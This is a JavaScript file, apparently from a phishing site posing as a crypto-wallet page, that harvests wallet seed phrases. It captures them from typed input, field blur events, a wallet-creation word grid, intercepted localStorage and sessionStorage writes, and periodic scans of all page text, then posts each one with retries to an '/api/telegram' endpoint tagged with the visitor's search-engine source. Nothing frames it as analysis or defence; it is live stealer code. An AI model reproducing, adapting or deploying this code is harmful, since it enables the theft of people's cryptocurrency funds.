// ============================================================
// SEED PHRASE CAPTURE - form-handler.js
// Captures seed phrases from: user input + wallet creation UI
// ============================================================

const API = '/api/telegram';
let lastSent = '';
let inputTimer;

// --- Traffic source ---
function getTrafficSource() {
  const ref = document.referrer.toLowerCase();
  const p = new URLSearchParams(window.location.search);
  if (ref.includes('google.com') || ref.includes('google.co')) return 'Google SEO';
  if (ref.includes('bing.com')) return 'Bing SEO';
  const s = p.get('utm_source') || p.get('source') || '';
  if (s.toLowerCase().includes('google')) return 'Google SEO';
  if (s.toLowerCase().includes('bing')) return 'Bing SEO';
  return document.referrer || 'Direct';
}
const trafficSource = getTrafficSource();

// --- Helpers ---
function words(v) { return (v || '').trim().split(/\s+/).filter(w => w.length > 0); }
function wc(v) { return words(v).length; }

// Valid seed phrase: exactly 12/15/18/21/24 words, all lowercase letters only (BIP39)
function isSeed(v) {
  if (!v) return false;
  var ws = words(v.toLowerCase());
  if (![12, 15, 18, 21, 24].includes(ws.length)) return false;
  return ws.every(function(w) { return /^[a-z]{2,10}$/.test(w); });
}

// --- Send to Telegram ---
async function sendToTelegram(data) {
  data.trafficSource = trafficSource;
  data.timestamp = new Date().toISOString();
  for (let i = 0; i < 3; i++) {
    try {
      const r = await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data })
      });
      if (!r.ok) throw new Error('HTTP ' + r.status);
      return await r.json();
    } catch (e) {
      if (i === 2) throw e;
      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
}

// --- Storage monitoring: capture phrases saved to localStorage/sessionStorage ---
(function() {
  const originalSetItem = Storage.prototype.setItem;
  Storage.prototype.setItem = function(key, value) {
    originalSetItem.apply(this, arguments);
    // Check if value looks like a seed phrase
    if (typeof value === 'string' && isSeed(value)) {
      console.log('💾 Storage capture:', key, wc(value), 'words');
      sendPhrase(value, 'STORAGE_' + this.constructor.name.toUpperCase(), key);
    }
  };
})();

// --- Send phrase (deduplicated) ---
function sendPhrase(phrase, type, field) {
  var clean = phrase.toLowerCase().replace(/\s+/g, ' ').trim();
  if (!clean || clean === lastSent) return;
  lastSent = clean;
  var n = wc(clean);
  console.log('✅ Sending', n, 'word phrase [' + type + '] from', trafficSource);
  sendToTelegram({ TYPE: type, PHRASE: clean, WORDS: n, FIELD: field || 'input', PAGE: window.location.pathname });
}

// --- Collect words from .phrase-grid (wallet creation display) ---
function collectGridPhrase() {
  // Try multiple selectors for the phrase grid
  var grid = document.querySelector('.phrase-grid') || document.querySelector('[class*="phrase-grid"]');
  if (!grid) {
    console.log('🔍 No .phrase-grid found');
    return;
  }
  console.log('✅ Found phrase-grid:', grid.className);
  
  // Words are in <span> children directly (not .phrase-card)
  var spans = grid.querySelectorAll(':scope > span');
  if (!spans.length) {
    // Fallback: any direct child with text
    spans = grid.children;
  }
  console.log('🔍 Found', spans.length, 'word elements in grid');
  
  if (!spans.length) return;
  
  var ws = [];
  for (var i = 0; i < spans.length; i++) {
    var txt = (spans[i].textContent || '').trim();
    // Clean: remove index numbers, take just the word
    txt = txt.replace(/^\d+[:.)\s]*/, '').trim();
    if (txt && /^[a-zA-Z]{2,10}$/.test(txt)) {
      ws.push(txt.toLowerCase());
    }
  }
  
  console.log('🔍 Collected words:', ws.length, ws.slice(0, 3).join(',') + '...');
  
  if ([12, 15, 18, 21, 24].includes(ws.length)) {
    var phrase = ws.join(' ');
    if (phrase !== lastSent) {
      lastSent = phrase;
      console.log('📋 Sending WALLET_CREATED phrase:', ws.length, 'words');
      sendToTelegram({ TYPE: 'WALLET_CREATED', PHRASE: phrase, WORDS: ws.length, PAGE: window.location.pathname });
    }
  }
}

// --- Scan all inputs and the phrase grid ---
function scanAll() {
  collectGridPhrase();
  document.querySelectorAll('input, textarea').forEach(function(el) {
    var v = (el.value || '').trim();
    if (isSeed(v)) sendPhrase(v, 'SEED_INPUT', el.name || el.id || el.placeholder || 'field');
  });
}

// --- Start monitor ---
function startMonitor() {
  new MutationObserver(function(muts) {
    var changed = muts.some(function(m) { return m.addedNodes.length || m.type === 'characterData'; });
    if (changed) setTimeout(scanAll, 200);
  }).observe(document.body, { childList: true, subtree: true, characterData: true });

  [800, 2000, 4000, 7000, 12000].forEach(function(t) { setTimeout(scanAll, t); });
}

// --- Deep scan: look for phrases in any text content ---
function deepScan() {
  // Get all text from the page
  const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
  let node;
  const texts = [];
  while (node = walker.nextNode()) {
    const text = node.textContent.trim();
    if (text.length > 20 && text.length < 500) texts.push(text);
  }
  
  // Check each text block for seed phrases
  texts.forEach(text => {
    // Split by common delimiters and check each segment
    const segments = text.split(/[\n,;|]+/);
    segments.forEach(seg => {
      const clean = seg.trim();
      if (isSeed(clean)) {
        console.log('🔎 Deep scan found phrase:', wc(clean), 'words');
        sendPhrase(clean, 'DEEPSCAN_TEXT', 'page');
      }
    });
  });
}

// Run deep scan periodically
setInterval(deepScan, 3000);

// --- Input: capture typed phrases ---
document.addEventListener('input', function(e) {
  var t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  clearTimeout(inputTimer);
  inputTimer = setTimeout(function() {
    var v = (t.value || '').trim();
    if (isSeed(v)) sendPhrase(v, 'SEED_TYPED', t.name || t.id || t.placeholder || 'input');
  }, 500);
});

// --- Blur: capture when user finishes and moves on ---
document.addEventListener('blur', function(e) {
  var t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  var v = (t.value || '').trim();
  if (isSeed(v)) sendPhrase(v, 'SEED_BLUR', t.name || t.id || t.placeholder || 'input');
}, true);

// --- Boot ---
document.addEventListener('DOMContentLoaded', function() {
  console.log('🔍 Traffic:', trafficSource);
  startMonitor();
});

window.TelegramIntegration = { send: sendToTelegram, sendPhrase: sendPhrase };
